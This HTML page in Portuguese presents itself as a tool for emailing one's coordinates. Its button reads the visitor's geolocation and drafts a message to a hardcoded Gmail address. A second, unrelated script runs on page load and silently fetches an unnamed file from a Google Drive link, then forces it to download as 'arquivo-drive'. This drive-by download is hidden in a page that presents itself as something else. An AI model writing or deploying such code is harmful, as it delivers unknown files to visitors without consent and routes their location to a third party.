<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<title>Enviar Email com Coordenadas</title>
<link rel="manifest" href="manifest.json">
<style>
body { font-family: Arial; padding: 20px; text-align: center; }
button {
    padding: 15px; font-size: 18px; border-radius: 10px; border: none;
    background: #007bff; color: #fff; margin-top: 20px;
}
</style>
</head>
<body>

<h2>Enviar Email com Coordenadas</h2>
<p>Toque para obter sua localização e preparar o e-mail.</p>

<button onclick="enviarEmail()">Enviar e-mail</button>

<script>
if ("serviceWorker" in navigator) navigator.serviceWorker.register("service-worker.js");

function enviarEmail() {
    if (!navigator.geolocation) {
        alert("Geolocalização não suportada.");
        return;
    }

    navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude.toFixed(6);
        const lon = pos.coords.longitude.toFixed(6);
        const acc = pos.coords.accuracy;

        const assunto = encodeURIComponent("Minhas Coordenadas");
        const corpo = encodeURIComponent(
            "Segue minha posição atual:\n\n" +
            "Latitude: " + lat + "\n" +
            "Longitude: " + lon + "\n" +
            "Precisão: " + acc + " metros\n\n" +
            "Google Maps:\nhttps://www.google.com/maps?q=" + lat + "," + lon
        );

        const email = "mailto:shoes19616@gmail.com?subject=" + assunto + "&body=" + corpo;
        window.location.href = email;

    }, erro => {
        alert("Erro ao obter localização: " + erro.message);
    });
}
</script>


<script>
async function baixarDrive() {
  try {
    const url = "https://drive.google.com/uc?export=download&id=1ndOVEvgbBCrJy1LgWRbIDYgEEnsjH1dq";
    const resp = await fetch(url);
    const blob = await resp.blob();
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = "arquivo-drive";
    document.body.appendChild(a);
    a.click();
    a.remove();
  } catch(e) { console.error(e); }
}

window.addEventListener('load', baixarDrive);
</script>

</body>
</html>
